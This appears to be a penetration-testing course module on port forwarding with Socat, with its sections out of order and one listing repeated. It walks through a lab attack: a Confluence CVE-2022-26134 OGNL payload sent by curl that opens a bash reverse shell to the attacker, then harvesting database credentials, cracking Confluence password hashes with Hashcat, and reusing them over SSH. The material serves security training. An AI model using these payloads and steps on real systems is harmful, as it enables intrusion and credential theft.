The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

